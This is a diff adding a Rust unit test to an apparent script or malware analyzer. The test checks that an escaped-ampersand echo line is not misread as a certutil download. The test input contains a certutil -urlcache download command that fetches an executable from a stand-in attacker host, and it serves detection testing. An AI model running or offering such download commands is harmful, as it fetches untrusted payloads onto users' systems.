@@ -40275,6 +40275,23 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
     }
 
     #[test]
+    fn escaped_ampersand_certutil_text_does_not_emit_structured_download() {
+        let report = analyze(
+            br#"echo keep ^& certutil -urlcache -split -f http://evil.example/p.exe p.exe"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDownload { url, .. } if url == "http://evil.example/p.exe"
+            )),
+            "escaped ampersand echo text was misread as certutil download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn certutil_urlcache_schemeless_source_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
